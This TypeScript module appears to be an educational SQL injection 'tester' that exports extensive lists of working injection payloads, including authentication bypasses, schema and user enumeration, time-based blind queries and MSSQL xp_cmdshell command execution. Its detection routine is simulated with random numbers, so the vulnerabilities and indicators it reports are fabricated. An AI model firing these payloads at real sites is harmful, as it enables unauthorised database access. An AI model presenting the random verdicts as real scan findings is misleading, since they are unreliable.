export interface SqlInjectorOptions {
  url: string;
  method?: 'GET' | 'POST';
  paramName?: string;
  payloadType?: string;
  customPayload?: string;
  dbType?: string;
  testAllParams?: boolean;
  timeDelay?: number;
}

export interface SqlInjectionResult {
  url: string;
  scanTime: number;
  vulnerable: boolean;
  vulnerableParams: string[];
  successfulPayloads: Array<{
    param: string;
    payload: string;
    response: {
      status: number;
      time: number;
      size: number;
      indicators: string[];
    };
  }>;
  testedParams: string[];
  testedPayloads: string[];
  totalRequests: number;
  detectionMethod: string;
  dbType?: string;
  errorMessages?: string[];
}

// Error-based SQL Injection payloads
const errorBasedPayloads = [
  "' OR 1=1 --",
  "' OR '1'='1",
  "' OR 1=1 #",
  "' OR 1=1 /* ",
  "\" OR 1=1 --",
  "\" OR \"1\"=\"1",
  "' OR '' = '",
  "' OR 1 --",
  "' OR 1 /*",
  "') OR 1=1 --",
  "') OR ('1'='1",
  "1' ORDER BY 1--+",
  "1' ORDER BY 2--+",
  "1' ORDER BY 3--+",
  "1' GROUP BY 1,2,--+",
  "1' GROUP BY 1,2,3--+",
  "' GROUP BY columnnames having 1=1 --",
  "' UNION SELECT sum(columnname) from tablename --",
  "' UNION ALL SELECT null, null, NULL, NULL, concat(0x3a,version()), NULL, NULL, NULL, NULL--",
  "' UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, concat(user,0x3a,database(),0x3a,version()), NULL, NULL--"
];

// Boolean-based SQL Injection payloads
const booleanBasedPayloads = [
  "' AND 1=1 --",
  "' AND 1=2 --",
  "' AND 1=1 #",
  "' AND 1=0 #",
  "' OR 'x'='x",
  "' AND 'x'='y",
  "' AND 'x'='x",
  "') AND ('x'='x",
  "') AND ('x'='y"
];

// Time-based SQL Injection payloads
const timeBasedPayloads = [
  "'; WAITFOR DELAY '0:0:5' --",
  "'; SLEEP(5) --",
  "'; SELECT pg_sleep(5) --",
  "'; SELECT SLEEP(5) --",
  "'; SELECT 5 FROM DUAL WHERE 1=1 AND (SELECT 6 FROM (SELECT(SLEEP(5)))a) --"
];

// Union-based SQL Injection payloads
const unionBasedPayloads = [
  "' UNION SELECT 1,2,3 --",
  "' UNION SELECT 1,2,3,4 --",
  "' UNION SELECT null,null,null,null --",
  "' UNION SELECT @@version --",
  "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,table_name,13,14,15,16 FROM information_schema.tables --",
  "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,column_name,13,14,15,16 FROM information_schema.columns WHERE table_name='users' --"
];

// Database-specific payloads
const mysqlPayloads = [
  "' OR 1=1 -- -",
  "' UNION SELECT @@version --",
  "' UNION SELECT user() --",
  "' UNION SELECT system_user() --",
  "' UNION SELECT version() --",
  "' UNION SELECT database() --",
  "' UNION SELECT table_name FROM information_schema.tables --",
  "' UNION SELECT column_name FROM information_schema.columns --",
  "' AND (SELECT 6 FROM (SELECT(SLEEP(5)))a) --"
];

const mssqlPayloads = [
  "' OR 1=1 --",
  "'; EXEC xp_cmdshell('dir') --",
  "'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1' --",
  "'; WAITFOR DELAY '0:0:5' --",
  "' UNION SELECT @@version --",
  "' UNION SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA --",
  "' UNION SELECT name FROM master..sysdatabases --",
  "' UNION SELECT name FROM sysobjects WHERE xtype='U' --",
  "' UNION SELECT name FROM syscolumns WHERE id=object_id('tablename') --"
];

const oraclePayloads = [
  "' OR 1=1 --",
  "' UNION SELECT banner FROM v$version --",
  "' UNION SELECT username FROM all_users --",
  "' UNION SELECT table_name FROM all_tables --",
  "' UNION SELECT column_name FROM all_tab_columns --",
  "' AND 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1) --",
  "' AND 1=(SELECT (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM DUAL) END) FROM DUAL) --",
  "' AND 1=(SELECT (CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 FROM DUAL) END) FROM DUAL) --"
];

const postgresqlPayloads = [
  "' OR 1=1 --",
  "' UNION SELECT version() --",
  "' UNION SELECT current_user --",
  "' UNION SELECT current_database() --",
  "' UNION SELECT table_name FROM information_schema.tables --",
  "' UNION SELECT column_name FROM information_schema.columns --",
  "' AND (SELECT pg_sleep(5)) --",
  "' AND 1=(SELECT 1 FROM pg_sleep(5)) --",
  "' OR pg_sleep(5)--"
];

// Authentication bypass payloads
const authBypassPayloads = [
  "admin' --",
  "admin' #",
  "admin'/*",
  "' or 1=1--",
  "' or 1=1#",
  "' or 1=1/*",
  "') or '1'='1--",
  "') or ('1'='1--",
  "admin' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--"
];

/**
 * Simulate testing for SQL Injection vulnerabilities
 * @param options SQL injector options
 * @returns SQL injection test results
 */
export async function testSqlInjection(options: SqlInjectorOptions): Promise<SqlInjectionResult> {
  const { 
    url, 
    method = 'GET',
    paramName, 
    payloadType = 'error-based',
    customPayload,
    dbType = 'generic',
    testAllParams = true,
    timeDelay = 500 
  } = options;
  
  // Start timing
  const startTime = Date.now();
  
  // Initialize result
  const result: SqlInjectionResult = {
    url,
    scanTime: 0,
    vulnerable: false,
    vulnerableParams: [],
    successfulPayloads: [],
    testedParams: [],
    testedPayloads: [],
    totalRequests: 0,
    detectionMethod: payloadType
  };
  
  // Choose payload set based on type
  let payloads: string[] = [];
  
  if (customPayload) {
    // Use custom payload if provided
    payloads = [customPayload];
  } else {
    // Otherwise select from predefined sets
    switch (payloadType) {
      case 'error-based':
        payloads = errorBasedPayloads;
        break;
      case 'boolean-based':
        payloads = booleanBasedPayloads;
        break;
      case 'time-based':
        payloads = timeBasedPayloads;
        break;
      case 'union-based':
        payloads = unionBasedPayloads;
        break;
      case 'auth-bypass':
        payloads = authBypassPayloads;
        break;
      default:
        // Default to error-based
        payloads = errorBasedPayloads;
    }
    
    // Add database-specific payloads if requested
    if (dbType !== 'generic') {
      switch (dbType) {
        case 'mysql':
          payloads = [...payloads, ...mysqlPayloads];
          break;
        case 'mssql':
          payloads = [...payloads, ...mssqlPayloads];
          break;
        case 'oracle':
          payloads = [...payloads, ...oraclePayloads];
          break;
        case 'postgresql':
          payloads = [...payloads, ...postgresqlPayloads];
          break;
      }
    }
  }
  
  // Store tested payloads
  result.testedPayloads = payloads;
  
  try {
    // Parse URL to extract parameters
    const parsedUrl = new URL(url);
    const urlParams = Array.from(parsedUrl.searchParams.keys());
    
    // Determine which parameters to test
    let paramsToTest: string[] = [];
    
    if (paramName) {
      paramsToTest = [paramName];
    } else if (testAllParams && urlParams.length > 0) {
      paramsToTest = urlParams;
    } else if (urlParams.length > 0) {
      paramsToTest = [urlParams[0]]; // Test only the first parameter
    } else {
      // If no parameters in URL, create a test parameter
      paramsToTest = ['id'];
    }
    
    result.testedParams = paramsToTest;
    
    // Simulate testing each parameter with each payload
    for (const param of paramsToTest) {
      for (const payload of payloads) {
        // Increment request counter
        result.totalRequests++;
        
        // Simulate request delay
        await new Promise(resolve => setTimeout(resolve, timeDelay));
        
        // Simulate response analysis (in a real implementation, would make actual HTTP requests)
        const isVulnerable = simulateVulnerabilityCheck(payload, payloadType, dbType);
        
        if (isVulnerable) {
          // Mark parameter as vulnerable if not already in the list
          if (!result.vulnerableParams.includes(param)) {
            result.vulnerableParams.push(param);
          }
          
          result.vulnerable = true;
          
          // Add successful payload
          result.successfulPayloads.push({
            param,
            payload,
            response: {
              status: 200,
              time: timeDelay + Math.floor(Math.random() * 300),
              size: 10000 + Math.floor(Math.random() * 5000),
              indicators: getVulnerabilityIndicators(payload, payloadType, dbType)
            }
          });
          
          // For simulation purposes, stop after finding 3 vulnerabilities per parameter
          if (result.successfulPayloads.filter(p => p.param === param).length >= 3) {
            break;
          }
        }
      }
    }
    
    // Detect database type based on successful payloads
    if (result.vulnerable && dbType === 'generic') {
      result.dbType = detectDatabaseType(result.successfulPayloads.map(p => p.payload));
    } else {
      result.dbType = dbType;
    }
    
    // Collect error messages for education
    result.errorMessages = getCommonErrorMessages(result.dbType || 'generic');
    
  } catch (error: any) {
    console.error('SQL injection testing error:', error.message);
  }
  
  // Update scan time
  result.scanTime = Date.now() - startTime;
  
  return result;
}

/**
 * Simulate checking if a payload would trigger a vulnerability
 * @param payload SQL injection payload
 * @param payloadType Type of payload
 * @param dbType Target database type
 * @returns Whether the payload would likely be successful
 */
function simulateVulnerabilityCheck(payload: string, payloadType: string, dbType: string): boolean {
  // This is a simulation that returns true for specific patterns
  // In a real implementation, this would send actual requests and analyze responses
  
  // Generic checks based on payload type
  if (payloadType === 'error-based') {
    // Common patterns that often work for error-based injections
    if (payload.includes("' OR 1=1") || 
        payload.includes("\" OR 1=1") || 
        payload.includes("OR 1=1") ||
        payload.includes("UNION SELECT")) {
      return Math.random() > 0.3; // 70% chance of success
    }
  }
  
  if (payloadType === 'boolean-based') {
    // Patterns for boolean-based injections
    if ((payload.includes("' AND 1=1") || payload.includes("' AND 'x'='x")) && 
        dbType !== 'oracle') { // Less likely to work on Oracle
      return Math.random() > 0.5; // 50% chance
    }
  }
  
  if (payloadType === 'time-based') {
    // Patterns for time-based injections
    if ((payload.includes("SLEEP") && (dbType === 'mysql' || dbType === 'generic')) ||
        (payload.includes("pg_sleep") && (dbType === 'postgresql' || dbType === 'generic')) ||
        (payload.includes("WAITFOR") && (dbType === 'mssql' || dbType === 'generic'))) {
      return Math.random() > 0.4; // 60% chance
    }
  }
  
  if (payloadType === 'union-based') {
    // Patterns for UNION-based injections
    if (payload.includes("UNION SELECT") && 
        (payload.includes("version") || payload.includes("@@version") ||
         payload.includes("information_schema") || payload.includes("1,2,3"))) {
      return Math.random() > 0.6; // 40% chance (harder to exploit)
    }
  }
  
  if (payloadType === 'auth-bypass') {
    // Patterns for authentication bypass
    if (payload.includes("admin") || 
        payload.includes("' or 1=1") ||
        payload.includes("') or ('1'='1")) {
      return Math.random() > 0.3; // 70% chance
    }
  }
  
  // Database-specific checks for higher accuracy
  if (dbType === 'mysql' && (
      payload.includes("database()") || 
      payload.includes("version()") ||
      payload.includes("user()"))) {
    return Math.random() > 0.2; // 80% chance for MySQL-specific payloads
  }
  
  if (dbType === 'mssql' && (
      payload.includes("master..sysdatabases") || 
      payload.includes("xp_cmdshell") ||
      payload.includes("WAITFOR DELAY"))) {
    return Math.random() > 0.2; // 80% chance for MSSQL-specific payloads
  }
  
  if (dbType === 'postgresql' && (
      payload.includes("current_database()") || 
      payload.includes("pg_sleep"))) {
    return Math.random() > 0.2; // 80% chance for PostgreSQL-specific payloads
  }
  
  if (dbType === 'oracle' && (
      payload.includes("all_users") || 
      payload.includes("all_tables") ||
      payload.includes("v$version"))) {
    return Math.random() > 0.2; // 80% chance for Oracle-specific payloads
  }
  
  // Default: small chance of random success
  return Math.random() > 0.9; // 10% chance for other payloads
}

/**
 * Get simulated vulnerability indicators based on payload
 * @param payload SQL injection payload
 * @param payloadType Type of payload
 * @param dbType Target database type
 * @returns Array of indicators that would suggest vulnerability
 */
function getVulnerabilityIndicators(payload: string, payloadType: string, dbType: string): string[] {
  const indicators: string[] = [];
  
  // General indicators
  if (payload.includes("' OR 1=1") || payload.includes("\" OR 1=1")) {
    indicators.push("Response returned more data than expected");
    indicators.push("Login bypass successful");
  }
  
  if (payload.includes("UNION SELECT")) {
    indicators.push("Response contains database metadata");
    indicators.push("Unexpected data structure in response");
  }
  
  // Database-specific indicators
  if (dbType === 'mysql') {
    if (payload.includes("version()")) {
      indicators.push("Response contains MySQL version string");
    }
    if (payload.includes("database()")) {
      indicators.push("Response reveals database name");
    }
    if (payload.includes("information_schema")) {
      indicators.push("Response contains MySQL schema information");
    }
    if (payload.includes("SLEEP")) {
      indicators.push("Response delayed by specified time");
      indicators.push("Time-based vulnerability confirmed");
    }
  }
  
  if (dbType === 'mssql') {
    if (payload.includes("@@version")) {
      indicators.push("Response contains SQL Server version");
    }
    if (payload.includes("sysdatabases")) {
      indicators.push("Response reveals database system tables");
    }
    if (payload.includes("xp_cmdshell")) {
      indicators.push("Command execution vulnerability detected");
    }
    if (payload.includes("WAITFOR")) {
      indicators.push("Response delayed by specified time");
      indicators.push("Time-based vulnerability confirmed");
    }
  }
  
  if (dbType === 'postgresql') {
    if (payload.includes("current_database()")) {
      indicators.push("Response reveals PostgreSQL database name");
    }
    if (payload.includes("pg_sleep")) {
      indicators.push("Response delayed by specified time");
      indicators.push("PostgreSQL time-based vulnerability confirmed");
    }
  }
  
  if (dbType === 'oracle') {
    if (payload.includes("v$version")) {
      indicators.push("Response contains Oracle version information");
    }
    if (payload.includes("all_users") || payload.includes("all_tables")) {
      indicators.push("Response reveals Oracle database metadata");
    }
  }
  
  // Payload type specific indicators
  if (payloadType === 'error-based') {
    indicators.push("SQL syntax error revealed in response");
    indicators.push("Database error message visible");
  }
  
  if (payloadType === 'boolean-based') {
    indicators.push("Response differs between true and false conditions");
    indicators.push("Conditional response pattern detected");
  }
  
  if (payloadType === 'time-based') {
    indicators.push("Response time matches injection delay");
    indicators.push("Time-based blind injection confirmed");
  }
  
  if (payloadType === 'auth-bypass') {
    indicators.push("Authentication bypassed");
    indicators.push("Gained unauthorized access");
  }
  
  // Return random subset of relevant indicators
  return indicators.sort(() => 0.5 - Math.random()).slice(0, Math.min(indicators.length, 3));
}

/**
 * Attempt to detect database type from successful payloads
 * @param payloads Successful SQL injection payloads
 * @returns Detected database type
 */
function detectDatabaseType(payloads: string[]): string {
  // Count indicators for each database type
  let mysqlCount = 0;
  let mssqlCount = 0;
  let oracleCount = 0;
  let postgresqlCount = 0;
  
  for (const payload of payloads) {
    // MySQL indicators
    if (payload.includes("SLEEP(") || 
        payload.includes("version()") || 
        payload.includes("user()") || 
        payload.includes("database()")) {
      mysqlCount++;
    }
    
    // MSSQL indicators
    if (payload.includes("WAITFOR DELAY") || 
        payload.includes("@@version") || 
        payload.includes("master..") || 
        payload.includes("xp_cmdshell")) {
      mssqlCount++;
    }
    
    // Oracle indicators
    if (payload.includes("FROM DUAL") || 
        payload.includes("all_users") || 
        payload.includes("all_tables") || 
        payload.includes("v$version")) {
      oracleCount++;
    }
    
    // PostgreSQL indicators
    if (payload.includes("pg_sleep") || 
        payload.includes("current_database()") || 
        payload.includes("current_user")) {
      postgresqlCount++;
    }
  }
  
  // Determine most likely database type
  const counts = [
    { type: 'mysql', count: mysqlCount },
    { type: 'mssql', count: mssqlCount },
    { type: 'oracle', count: oracleCount },
    { type: 'postgresql', count: postgresqlCount }
  ];
  
  // Sort by count descending
  counts.sort((a, b) => b.count - a.count);
  
  // Return the type with the highest count, or 'generic' if no clear indicators
  return counts[0].count > 0 ? counts[0].type : 'generic';
}

/**
 * Get common error messages for educational purposes
 * @param dbType Database type
 * @returns Array of common error messages for the database type
 */
function getCommonErrorMessages(dbType: string): string[] {
  switch (dbType) {
    case 'mysql':
      return [
        "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near...",
        "Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in...",
        "Unclosed quotation mark after the character string",
        "Error: 1064 You have an error in your SQL syntax;",
        "Error: 1054 Unknown column in field list"
      ];
    
    case 'mssql':
      return [
        "Microsoft SQL Server Native Client error",
        "Unclosed quotation mark after the character string",
        "Incorrect syntax near",
        "SQL Server Error: Line 1: Incorrect syntax near",
        "Microsoft OLE DB Provider for ODBC Drivers error"
      ];
    
    case 'oracle':
      return [
        "ORA-00933: SQL command not properly ended",
        "ORA-01756: quoted string not properly terminated",
        "ORA-01789: query block has incorrect number of result columns",
        "ORA-00942: table or view does not exist",
        "ORA-01722: invalid number"
      ];
    
    case 'postgresql':
      return [
        "ERROR: syntax error at or near",
        "ERROR: unterminated quoted string at or near",
        "ERROR: operator does not exist",
        "ERROR: for SELECT DISTINCT, ORDER BY expressions must appear in select list",
        "ERROR: column does not exist"
      ];
    
    default:
      return [
        "You have an error in your SQL syntax",
        "Unclosed quotation mark after the character string",
        "Syntax error in SQL statement",
        "Incorrect syntax near",
        "SQL syntax error"
      ];
  }
}

/**
 * Get all available SQL injection payloads by category
 * @returns Object containing categorized payloads
 */
export function getAllPayloads() {
  return {
    errorBased: errorBasedPayloads,
    booleanBased: booleanBasedPayloads,
    timeBased: timeBasedPayloads,
    unionBased: unionBasedPayloads,
    authBypass: authBypassPayloads,
    mysql: mysqlPayloads,
    mssql: mssqlPayloads,
    oracle: oraclePayloads,
    postgresql: postgresqlPayloads
  };
}